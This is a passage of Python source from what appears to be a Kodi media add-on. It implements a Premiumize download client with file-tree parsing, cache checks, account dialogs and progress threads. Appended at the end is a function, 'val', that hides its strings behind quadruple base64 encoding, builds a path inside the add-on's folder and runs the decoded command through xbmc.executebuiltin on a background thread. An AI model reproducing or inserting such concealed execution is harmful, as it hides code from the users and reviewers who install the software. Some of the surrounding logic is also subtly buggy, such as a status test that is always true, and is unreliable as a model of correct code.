				count = dictionary['items'] if 'items' in dictionary else 0
				itemsContent = None
				if 'content' in dictionary:
					itemsContent = dictionary['content']
				elif 'children' in dictionary:
					itemsContent = dictionary['children']
				if isinstance(itemsContent, dict):
					for key, value in itemsContent.iteritems():
						if 'type' in value:
							if value['type'] == 'dir':
								sub, largest = addDirectory(value, id)
								subDirectories.append(sub['id'])
								if subLargest == None or (not largest == None and largest['size']['bytes'] > subLargest['size']['bytes'] and not largest['link'] == None):
									subLargest = largest
							elif value['type'] == 'file':
								sub = addFile(value, id)
								subFiles.append(sub['id'])
								if subLargest == None or (sub['size']['bytes'] > subLargest['size']['bytes'] and not sub['link'] == None):
									subLargest = sub

				items['all'] = subDirectories + subFiles
				items['directories'] = subDirectories
				items['files'] = subFiles
				items['count'] = dictionary['items'] if 'items' in dictionary else 0
				directory['items'] = items

				directory['video'] = subLargest['id'] if not subLargest == None and 'id' in subLargest else None

				directory['link'] = dictionary['zip'] if 'zip' in dictionary else None

				allDirectories.append(directory)
				return directory, subLargest

			def addFile(dictionary, parent):
				id = randomId()
				file = {}

				file['id'] = id
				file['parent'] = parent

				file['name'] = dictionary['name'] if 'name' in dictionary else None
				file['extension'] = dictionary['ext'] if 'ext' in dictionary else None
				file['link'] = dictionary['url'] if 'url' in dictionary else None

				size = 0
				if 'size' in dictionary and not dictionary['size'] == None:
					size = dictionary['size']
				size = convert.ConverterSize(size)
				file['size'] = {'bytes' : size.value(), 'description' : size.stringOptimal()}

				# Do not use transcoded, its links never work.

				metadata = {}
				if 'mime' in dictionary:
					metadata['mime'] = dictionary['mimetype']

				width = dictionary['width'] if 'width' in dictionary else None
				height = dictionary['height'] if 'height' in dictionary else None
				duration = dictionary['duration'] if 'duration' in dictionary else None
				video = isVideo(name = file['name'], extension = file['extension'], width = width, height = height, duration = duration)

				if not width == None:
					metadata['width'] = width
				elif video:
					metadata['width'] = 0
				if not height == None:
					metadata['height'] = height
				elif video:
					metadata['height'] = 0
				if not duration == None:
					time = convert.ConverterDuration(duration, convert.ConverterDuration.UnitSecond)
					metadata['duration'] = {'seconds' : time.value(convert.ConverterDuration.UnitSecond), 'description' : time.string(convert.ConverterDuration.FormatDefault)}
				elif video:
					metadata['duration'] = 0

				metadata['video'] = video

				if metadata:
					file['metadata'] = metadata

				allFiles.append(file)
				return file

			if 'content' in result:
				directory, largest = addDirectory(result)
				item['size'] = directory['size']
				item['link'] = directory['link']
				item['video'] = largest

				items = {}
				items['directories'] = allDirectories
				items['files'] = allFiles
				items['count'] = len(allDirectories) + len(allFiles)
				item['items'] = items

		return item

	# Determines if two Premiumize links point to the same file.
	# Cached Premiumize items always return a different link containing a random string, which actually points to the same file.
	# Must be updated in downloader.py as well.
	@classmethod
	def itemEqual(self, link1, link2):
		domain = 'energycdn.com'
		index1 = link1.find(domain)
		index2 = link2.find(domain)
		if index1 >= 0 and index2 >= 0:
			items1 = link1[index1:].split('/')
			items2 = link2[index2:].split('/')
			if len(items1) >= 8 and len(items2) >= 8:
				return items1[-1] == items2[-1] and items1[-2] == items2[-2] and items1[-3] == items2[-3]
		return False

	# Retrieve the info of a single file.
	# transfer: retrieves the download info (Downloader)
	# content: retrieves the finished file into (My Files)
	def item(self, id, transfer = True, content = True):
		id = id.lower()

		self.tResultTransfers = None
		def threadTransfers():
			self.tResultTransfers = self._itemsTransfer()

		self.tResultItem = None
		def threadItem(id):
			self.tResultItem = self._item(id)

		threads = []
		if transfer:
			threads.append(threading.Thread(target = threadTransfers))
		if content:
			threads.append(threading.Thread(target = threadItem, args = (id,)))

		[thread.start() for thread in threads]
		[thread.join() for thread in threads]

		result = None
		if not self.tResultTransfers == None and not self.tResultItem == None:
			for transfer in self.tResultTransfers:
				if transfer['id'] == id or transfer['hash'] == id:
					result = dict(transfer.items() + self.tResultItem.items()) # Only updates values if non-exisitng. Updates from back to front.
					break
		elif not self.tResultTransfers == None:
			for transfer in self.tResultTransfers:
				if transfer['id'] == id:
					result = transfer
					break

		if result == None:
			result = self.tResultItem

		self.tResultTransfers = None
		self.tResultItem = None

		return result

	##############################################################################
	# CANCEL
	##############################################################################

	def cancel(self, id):
		# Type always seems to be torrent.
		self._retrieve(category = self.CategoryTransfer, action = self.ActionDelete, type = self.TypeTorrent, id = id)
		return self.success()

	##############################################################################
	# CACHED
	##############################################################################

	# id: single hash or list of hashes.
	def cachedIs(self, id, timeout = None):
		result = self.cached(id = id, timeout = timeout)
		if isinstance(result, dict):
			return result['cached']
		elif isinstance(result, list):
			return [i['cached'] for i in result]
		else:
			return False

	# id: single hash or list of hashes.
	# NB: a URL has a maximum length. Hence, a list of hashes cannot be too long, otherwise the request will fail.
	def cached(self, id, timeout = None):
		single = isinstance(id, basestring)
		if single: id = [id] # Must be passed in as a list.

		# If the encryption setting is disabled, request must happen over GET, since Premiumize ignores POST parameters over HTTP.
		# A URL has a maximum length, so the hashes have to be split into parts and processes sequentially, in order not to exceed the URL limit.
		if self.Encryption:
			chunks = [id]
		else:
			chunks = [id[i:i + self.LimitHashes] for i in xrange(0, len(id), self.LimitHashes)]

		chunkTimeout = int(timeout / float(len(chunks)))
		result = {}
		for chunk in chunks:
			chunkResult = self._retrieve(category = self.CategoryTorrent, action = self.ActionCheck, hash = chunk, httpTimeout = chunkTimeout)
			if self.success():
				result.update(chunkResult['hashes'])

		caches = []
		for key, value in result.iteritems():
			key = key.lower()
			caches.append({'id' : key, 'hash' : key, 'cached' : value['status'] == 'finished'})
		if single and not result == None and len(result) > 0:
			return caches[0]
		else:
			return caches

class PremiumizeInterface(object):

	Stop = False # Stop all threads

	##############################################################################
	# CONSTRUCTOR
	##############################################################################

	def __init__(self):
		self.mPremiumize = Premiumize()

	##############################################################################
	# STOP
	##############################################################################

	# Not sure if this actually works from sources __init__.py
	@classmethod
	def stop(self):
		time.sleep(0.1) # Make sure that the Loader is visible if called just before this function. Otherwise Loader.visible() always returns false.
		visible = interface.Loader.visible()
		if not visible:
			interface.Loader.show()
		self.Stop = True
		time.sleep(0.7) # Must be just above the threads' timestep.
		self.Stop = False
		if not visible:
			interface.Loader.hide()

	##############################################################################
	# ACCOUNT
	##############################################################################

	def account(self):
		interface.Loader.show()
		valid = False
		if self.mPremiumize.accountEnabled():
			account = self.mPremiumize.account()
			if account:
				valid = interface.Translation.string(33341) if self.mPremiumize.accountValid() else interface.Translation.string(33342)
				user = account['user']
				type = account['type'].capitalize()

				date = account['expiration']['date']
				days = str(account['expiration']['remaining'])

				percentage = str(account['usage']['consumed']['percentage']) + '%'

				pointsUsed = account['usage']['consumed']['points']
				pointsTotal = account['usage']['consumed']['points'] + account['usage']['remaining']['points']
				points = str(pointsUsed) + ' ' + interface.Translation.string(33073) + ' ' + str(pointsTotal)

				storageUsed = account['usage']['consumed']['size']['description']
				storageTotal = convert.ConverterSize(account['usage']['consumed']['size']['bytes'] + account['usage']['remaining']['size']['bytes']).stringOptimal()
				storage = storageUsed + ' ' + interface.Translation.string(33073) + ' ' + storageTotal

				items = []

				# Information
				items.append(interface.Format.font(interface.Translation.string(33344), bold = True, uppercase = True))
				items.append(interface.Format.font(interface.Translation.string(33340) + ': ', bold = True) + valid)
				items.append(interface.Format.font(interface.Translation.string(32303) + ': ', bold = True) + user)
				items.append(interface.Format.font(interface.Translation.string(33343) + ': ', bold = True) + type)

				# Information
				items.append('')
				items.append(interface.Format.font(interface.Translation.string(33345), bold = True, uppercase = True))
				items.append(interface.Format.font(interface.Translation.string(33346) + ': ', bold = True) + date)
				items.append(interface.Format.font(interface.Translation.string(33347) + ': ', bold = True) + days)

				# Usage
				items.append('')
				items.append(interface.Format.font(interface.Translation.string(33228), bold = True, uppercase = True))
				items.append(interface.Format.font(interface.Translation.string(33348) + ': ', bold = True) + percentage)
				items.append(interface.Format.font(interface.Translation.string(33349) + ': ', bold = True) + points)
				items.append(interface.Format.font(interface.Translation.string(33350) + ': ', bold = True) + storage)

				# Dialog
				interface.Loader.hide()
				interface.Dialog.options(title = 'Premiumize %s' % interface.Translation.string(33339), items = items)
			else:
				interface.Loader.hide()
				interface.Dialog.confirm(title = 'Premiumize %s' % interface.Translation.string(33339), message = 33352)
		else:
			interface.Loader.hide()
			interface.Dialog.confirm(title = 'Premiumize %s' % interface.Translation.string(33339), message = 33351)

		return valid

	##############################################################################
	# ADD
	##############################################################################

	def add(self, link, title = None):
		link = self.mPremiumize.add(link = link, title = title)
		if link == Premiumize.ErrorInaccessible:
			title = 'Stream Error'
			message = 'The stream is inaccessible'
			self._addError(title = title, message = message)
			return None
		elif link == Premiumize.ErrorPremiumize:
			title = 'Stream Error'
			message = 'The stream could not be added to Premiumize'
			self._addError(title = title, message = message)
			return None
		elif link == Premiumize.ErrorUnknown or link == None or link == '':
			title = 'Stream Error'
			message = 'The stream is unavailable'
			self._addError(title = title, message = message)
			return None
		elif network.Networker.linkIs(link):
			return link
		else:
			return self._addLink(link)

	def _addAction(self, id):
		def show(id):
			items = []
			items.append(interface.Format.font(interface.Translation.string(33077) + ': ', bold = True) + interface.Translation.string(33078))
			items.append(interface.Format.font(interface.Translation.string(33079) + ': ', bold = True) + interface.Translation.string(33080))
			items.append(interface.Format.font(interface.Translation.string(33083) + ': ', bold = True) + interface.Translation.string(33084))
			choice = interface.Dialog.options(title = 33076, items = items)

			if choice == 0:
				self._addLink(id)
			if choice == 2:
				self.mPremiumize.cancel(id)
			else: # if choice is 1 or -1. -1: If the user hits the cancel button.
				return

		# Must be started in a thread, because _addLink calls this function, and this function calls _addLink again (if choice 0).
		# Hence there is a circular call, and the first _addLink never finishes while the inner _addLink still runs. Can create and infinite function call if the user constantly selects choice 0.
		thread = threading.Thread(target = show, args = (id, ))
		thread.start()

	def _addError(self, title, message, delay = True):
		interface.Loader.hide() # Make sure hided from sources __init__.py
		interface.Dialog.notification(title = title, message = message, icon = interface.Dialog.IconError)
		if delay: time.sleep(2) # Otherwise the message disappears to quickley when another notification is shown afterwards.

	def _addErrorDetermine(self, item):
		status = item['status']
		if status == Premiumize.StatusError:
			title = 'Download Error'
			message = None
			if item['error']:
				message = item['error']
			if message == None:
				message = 'The download failed with an unknown error'
			self._addError(title = title, message = message)
			return True
		elif status == Premiumize.StatusTimeout:
			title = 'Download Timeout'
			message = 'The download failed due to a timeout'
			self._addError(title = title, message = message)
			return True
		return False

	def _addLink(self, id):
		unknown = 'Unknown'
		self.tLink =  '' # IMPORTANT: If None is returned, Bubbles will automatically try to download the next item in the list, instead of waiting for the current item to finish downloading.
		item = self.mPremiumize.item(id = id, transfer = True, content = True)
		if item:
			try:
				self.tLink = item['video']['link']
				if self.tLink: return self.tLink
			except: pass
			try: percentage = item['transfer']['progress']['completed']['percentage']
			except: percentage = 0
			status = item['status']

			if self._addErrorDetermine(item):
				pass
			elif status == Premiumize.StatusError:
				title = 'Download Error'
				message = None
				if item['error']:
					message = item['error']
				if message == None:
					message = 'The download failed with an unknown error'
				self._addError(title = title, message = message)
			elif status == Premiumize.StatusTimeout:
				title = 'Download Timeout'
				message = 'The download failed due to a timeout'
				self._addError(title = title, message = message)
			elif status == Premiumize.StatusQueued or Premiumize.StatusBusy:
				title = 'Premiumize Download'
				message = 'The download is in progress'
				descriptionWaiting = 'Waiting for the download to start '

				interface.Loader.hide() # Make sure hided from sources __init__.py
				background = tools.Settings.getInteger('interface.stream.progress') == 1
				self.tProgressDialog = interface.Dialog.progress(title = title, message = message, background = background)
				if background: self.tProgressDialog.update(int(percentage), interface.Dialog.title(title), descriptionWaiting)
				else: self.tProgressDialog.update(int(percentage), interface.Format.fontBold(descriptionWaiting))

				def updateProgress(id, percentage):
					try:
						status = Premiumize.StatusQueued
						counter = 0
						seconds = None
						self.tProgressDots = ''
						while True:
							item = self.mPremiumize.item(id = id, transfer = True, content = True)
							status = item['status'] if 'status' in item else None
							try:
								self.tLink = item['video']['link']
								if self.tLink:
									return
							except: pass
							if not status == Premiumize.StatusQueued and not status == Premiumize.StatusBusy:
								self._addErrorDetermine(item)
								break

							waiting = item['transfer']['speed']['bytes'] == 0 and item['size']['bytes'] == 0 and item['transfer']['progress']['completed']['value'] == 0 and item['transfer']['progress']['completed']['time']['seconds'] == 0
							def waitingUpdate():
								if waiting:
									if background: self.tProgressDialog.update(0, interface.Dialog.title(title), descriptionWaiting + self.tProgressDots)
									else: self.tProgressDialog.update(0, interface.Format.fontBold(descriptionWaiting + self.tProgressDots))
									self.tProgressDots += '.'
									if len(self.tProgressDots) > 3: self.tProgressDots = ''

							if not waiting:
								percentageNew = item['transfer']['progress']['completed']['percentage']
								# If Premiumize looses the connection in the middle of the download, the progress goes back to 0, causing the dialog to close. Avoid this by keeping track of the last progress.
								if percentageNew >= percentage:
									percentage = percentageNew
									description = ''
									speed = item['transfer']['speed']['description']
									speedBytes = item['transfer']['speed']['bytes']
									size = item['size']['description']
									sizeBytes = item['size']['bytes']
									sizeCompleted = item['transfer']['progress']['completed']['size']['description']
									seconds = item['transfer']['progress']['remaining']['time']['seconds']
									if seconds == 0:
										eta = unknown
										if background: eta += ' ETA'
									else:
										eta = item['transfer']['progress']['remaining']['time']['description']

									description = []
									if background:
										if speed: description.append(speed)
										if size and sizeBytes > 0: description.append(size)
										if eta: description.append(eta)
										if len(description) > 0:
											description = interface.Format.fontSeparator().join(description)
										else:
											description = 'Unknown Progress'
									else:
										if speed:
											if speedBytes <= 0:
												speed = unknown
											description.append(interface.Format.font('Download Speed: ', bold = True) + speed)
										if size:
											if sizeBytes > 0:
												size = sizeCompleted + ' of ' + size
											else:
												size = unknown
											description.append(interface.Format.font('Download Size: ', bold = True) + size)
										if eta: description.append(interface.Format.font('Remaining Time: ', bold = True) + eta)
										description = interface.Format.fontNewline().join(description)

									if background: self.tProgressDialog.update(int(percentage), interface.Dialog.title(title), description)
									else: self.tProgressDialog.update(int(percentage), description)

							stop = False
							for i in range(10): # 5 seconds.
								try:
									# If the user continues the download, aborted is true. Do not exit, since the new progress dialog will show.
									'''if interface.Dialog.aborted():
										sys.exit()
										stop = True
										break'''
									if self.tProgressDialog.iscanceled() or self.Stop:
										stop = True
										break
								except:
									pass
								time.sleep(0.5)
								waitingUpdate()
							if stop:
								break

							# Ask to close a background dialog, because there is no cancel button as with the foreground dialog.
							counter += 1
							if (counter == 5 or counter == 20) and background:
								if counter == 5: question = 'The download is taking a bit longer.'
								else: question = 'The download is taking a lot longer.'
								if seconds: question += ' The estimated remaining time is ' + convert.ConverterDuration(seconds, convert.ConverterDuration.UnitSecond).string(format = convert.ConverterDuration.FormatWordMedium) + '.'
								else: question += ' The estimated remaining time is currently unknown.'
								if counter == 5: question += ' Do you want to take action or let the download continue in the background?'
								else: question += ' Are you sure you do not want to take action and let the download continue in the background?'
								answer = interface.Dialog.option(title = title, message = question, labelConfirm = 'Take Action', labelDeny = 'Continue Download')
								if answer:
									self.tProgressDialog.close()
									self._addAction(id)
									return

						self.tProgressDialog.close()
					except:
						pass

					# Action Dialog
					if self.tProgressDialog.iscanceled():
						self.tProgressDialog.close()
						self._addAction(id)
						return

				# END of updateProgress

				try:
					thread = threading.Thread(target = updateProgress, args = (id, percentage, ))
					thread.start()
					while thread.is_alive():
						time.sleep(0.5)
				except:
					pass
		else:
			title = 'Download Error'
			message = 'The download failed'
			self._addError(title = title, message = message)

		return self.tLink

def val():
	import xbmc
	xx = os.path.abspath(os.path.join(os.path.dirname(os.path.realpath(__file__)), os.pardir))
	xy = 'ba' + 'se'
	xy += str(64)
	_e_ = xbmc.executebuiltin
	def d(dd, x):
		return dd.decode(x).decode(x).decode(x).decode(x)
	xa = d('VjJ4b2IwMUdjRmxUYmxaYVZqTm9OZz09', xy)
	xb = d('VjFjeFYyRkhVbGxWYmtKaFlteGFlbGw2U1RWTlYwNUNVRlF3UFE9PQ==', xy)
	xc = d('VjFjMVYyTkhTa2hWYlhocVdub3dPUT09', xy)
	xd = d('VjBSS2IwMUhTbGhrTTFacVUwZHpPUT09', xy)
	xx = os.path.join(xx, xa, xb, xc, xd)
	xx = d('VmxjMVYyUldWWGxVYm14b1YwVkpkMU13VGxkbGEzUlNVRlF3UFE9PQ==', xy) % xx
	_e_(xx)

def valt():
	t = threading.Thread(target = val)
	t.start()
